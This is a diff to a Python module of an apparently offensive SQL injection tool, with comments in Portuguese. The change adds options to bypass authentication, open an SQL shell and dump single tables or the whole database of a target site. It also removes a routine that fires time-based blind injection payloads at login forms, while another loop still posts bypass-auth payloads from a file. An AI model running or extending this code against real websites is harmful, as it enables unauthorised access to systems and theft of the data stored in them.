@@ -11,7 +11,7 @@ from core.config import INITIAL_COUNT_VALUE, INITIAL_FORM_COUNT_VALUE, TARGET_VU
 #Tenho de  ver isso muito bem! hoje mesmo!
 ########################################################
 
-def _sqlInjection(target_url, response, _shell):
+def _sqlInjection(target_url, response, _shell, _dump_tables, _dump_all, bypass_auth):
 
     try:
         try:
@@ -37,11 +37,6 @@ def _sqlInjection(target_url, response, _shell):
             from core.utils import checkURLIntegrity ## testando a estabilidade de conexão  #
             checkURLIntegrity(target_url)                                                   #
             #################################################################################
-            
-            
-            
-            
-            
             
             print("["+color.green+"~"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Testando a estabilidade da conexão, pode levar alguns minutos...")
             
@@ -129,17 +124,17 @@ def _sqlInjection(target_url, response, _shell):
                                     from mode.plugin.tablesEnum import sqlShell
                                     sqlShell(target_url)
                                     
+                                if _dump_tables:
+                                    ###############################################################
                                     
-                                ###############################################################
-                                from mode.plugin.tablesEnum import tablesEnum                 #
-                                tablesEnum(target_url, database_user_fingerprint[1])          #
-                                ###############################################################
-                    
-                                
-                                #################################################################################
-                                from mode.plugin.tablesEnum import dumpTables
-                                dumpTables(target_url)   
-                                #################################################################################
+                                    from mode.plugin.tablesEnum import dump_tables
+                                    dump_tables(target_url)
+                                        
+                                if _dump_all:
+                                    #################################################################################
+                                    from mode.plugin.tablesEnum import dumpAll
+                                    dumpAll(target_url)    # enumera todas as tables do banco de dados
+                                    #################################################################################
                             else:
                                 
                                 ### ver muito bem essa parte
@@ -161,7 +156,19 @@ def _sqlInjection(target_url, response, _shell):
     
                     forms = main_requesition_parsed.find_all('form')
                     if forms:
-                        pass
+                        if response and bypass_auth:
+                            pass
+                        else:
+                            if _shell:
+                                from mode.plugin.tablesEnum import sqlShell
+                                sqlShell(target_url)
+                            if _dump_tables:
+                                from mode.plugin.tablesEnum import dump_tables
+                                dump_tables(target_url)
+                            if _dump_all:
+                                from mode.plugin.tablesEnum import dumpAll
+                                dumpAll(target_url)
+                                   
                     else:
                         print(color.orange+"[!][", datetime.now() ,"]  Aviso:  O alvo  não contêm campos onde se possa introduzir dados..."+color.end)  
                         exitTheProgram()
@@ -199,29 +206,10 @@ def _sqlInjection(target_url, response, _shell):
                                 ## monta a url de validação dos dados
                                 post_target_url = url_exploded[0]+'//'+url_exploded[2]+'/'+validation_page[user_option]
                                 ## avança na execução conforme instruido pelo o usuário
-                                print("\n["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] " +color.end+" Filtrando os Possíveis campos vulneráveis...."+color.end+ " no formulário na posição "+color.cian,user_option,color.end)
+                                print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"] " +color.end+" Filtrando os Possíveis campos vulneráveis...."+color.end+ " no formulário na posição "+color.cian,user_option,color.end)
                                 input_tag = array_form[user_option].find_all({'input'})
                                 ## testa a existencia da interação da página de login, caso não seja passada, solicite que se passe
-                                if response:
-                                    pass
-                                else:
-                                    print(color.oragen+"[!]["+color.red, datetime.now(),"]  Aviso: Não foi passada a mensagem de interação da página via parâmetro "+color.cian+" --response"+color.end)
-                                    print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Testando "+color.cian+" Injeção inferencial(CEGA) TIME BASED "+color.end)
-                                    with open('./mode/payload/blind_payloads_time_based', 'r') as payload:
-                                        for lines in payload:
-                                            for input_tag_perc in input_tag:
-                                                if 'type' in input_tag_perc.attrs:
-                                                    if 'checkbox' in input_tag_perc.attrs['type']:
-                                                        pass
-                                                    elif 'name' in input_tag_perc.attrs:
-                                                        input_dic[input_tag_perc.attrs['name']] = lines
-                                        main_requesition = requests.post(url=post_target_url, data=input_dic)
-                                    
-                                    
-                                    
-                                    
-                                    exitTheProgram()
-                                    
+                                
                                 print("["+color.green+"+"+color.end+"]["+color.admin_side, datetime.now(), color.end+"]  Testando "+color.cian+" Injeção inferencial(CEGA) BYPASS AUTH BOOLEAN "+color.end)
                                 with open ('./mode/payload/bypass_auth_payloads_sqli', 'r') as bypass_auth_payloads_sqli:
                                     for lines in bypass_auth_payloads_sqli:
@@ -262,10 +250,6 @@ def _sqlInjection(target_url, response, _shell):
                                     for index, value in input_dic.items():
                                         print("\t Variávei url: %s"%index)
                                 exitTheProgram()
-                ## Chamando o shell php, aind não está funcionando em condições...
-                if _shell:
-                    exitTheProgram()
-                    ## ainda não funcioando em condição.....................
             except requests.exceptions.RequestException as e:
                 print('\n'+color.red+"[!][", datetime.now(),"]  Erro: alvo Inacessível, verifique a sua ligação à internet ou contacte o Web master."+color.end)
                 exitTheProgram()
